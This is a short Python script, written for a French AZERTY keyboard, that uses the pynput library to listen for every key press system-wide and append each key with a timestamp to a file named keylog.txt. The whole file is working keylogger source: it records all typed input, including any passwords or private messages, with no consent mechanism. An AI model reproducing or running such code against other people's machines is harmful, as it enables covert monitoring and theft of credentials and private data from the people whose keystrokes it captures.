from pynput.keyboard import Key, Listener
from datetime import datetime

with open('keylog.txt', 'w') as f:
    date = datetime.now().strftime("%m/%d/%Y")
    f.write(date + "_")

def on_press(key):
    k = str(key)
    if k.find("\\x") != -1:
        k = k.replace("\\x", "")
        k = str(k)
    k = k.replace("_lock", "Lock")
    k = k.replace("_l", ".gauche").replace("_r", ".droit").replace("_gr", "Gr")
    k = k.replace("&", "1").replace("é", "2").replace('"', "3").replace("(", "5").replace("-", "6").replace("è", "7").replace("_", "8").replace("ç", "9").replace("à", "0")
    k = k.replace("'", "").replace("\n", "").replace("Key.", "")
    if k == "33":
        k = "4"
    if k.find("<") != -1 and k.find(">") != -1:
        k = k.replace("<", "").replace(">", "")
        k = "Numpad" + str(int(k) - 96)
    print(k)
    with open('keylog.txt', 'a') as f:
        time = datetime.now().strftime("%H_%M_%S_%f")
        f.write(k + "_" + time + "_")
 
with Listener(on_press=on_press) as listener :
    listener.join()